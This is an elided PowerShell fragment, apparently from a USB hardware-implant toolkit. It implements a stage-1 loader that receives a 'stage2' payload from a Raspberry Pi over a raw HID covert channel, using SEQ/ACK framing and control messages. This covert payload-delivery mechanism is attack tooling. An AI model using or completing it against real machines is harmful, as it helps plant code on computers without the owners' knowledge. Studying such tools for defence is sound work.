...
function RequestStage2 ($HIDin, $HIDout) {
    ...
    $connect_req[2] = $connect_req[2] -bor 128 # set CONNECT BIT (LinkLayer)
...
[Console]::WriteLine("Stage1: Connect request sent")
    ...
    #####
    $cr = $HIDin.Read($response, 0, 65)
    #$SEQ = $response[2] -band 63 # set correct SEQ number (retrieved in last loop from first packet with CONNECT BIT set)
    $ACK = $SEQ
    ...
    # the pi should be aware of our stage1 request, we continue with STOP-AND-WAIT till we receive the first stage1
...
#[Console]::WriteLine("Stage2: Received SEQ {0}, LAST_SEQ {1}" -f ($SEQ, $LAST_SEQ))

        # check if response contains data
        if ($LEN -gt 0)
        {
            $CH = $response[3..6]
            $CTRL_MSG = $response[7..10]
            ...
            $CH = [System.BitConverter]::ToUInt32($CH, 0)
            $CTRL_MSG = [System.BitConverter]::ToUInt32($CTRL_MSG, 0)
            ...
            if ($stage2 -eq $null)
            {
                ...
                if (($CH -eq 0) -and ($CTRL_MSG -eq 1000)) # channel needs to be control channel and msg_type needs to be STAGE2_RESPONSE (=1000) 
                {
                    $stage2 = $response[11..(2+$LEN)] # omit header bytes (0 = ID, 1 = LEN/FIN, 2 = SEQ, 3 = CHANNEL TYPE / SUBTYPE)           
                }
                else
                {
    ...
    # send response with valid ACK to inform sender that stage2 has been received
    $CH = [BitConverter]::GetBytes([uint32]0)
    $CTRL_MSG = [BitConverter]::GetBytes([uint32]2) # stage2 received message
    # account for endianess (Convert to network order)
    if ([System.BitConverter]::IsLittleEndian) {
        [array]::Reverse($CH) # not needed as this is zero
        [array]::Reverse($CTRL_MSG)
    ...
    $stage2received = [Byte[]](0, ($LEN -bor $FIN_BIT), $ACK) + $payload + (New-Object byte[] (62 - $LEN))
    $HIDout.Write($stage2received, 0, 65)
...
$stage2 = Get-Content stage2_new.ps1 | Out-String # we load stage 2 from disk
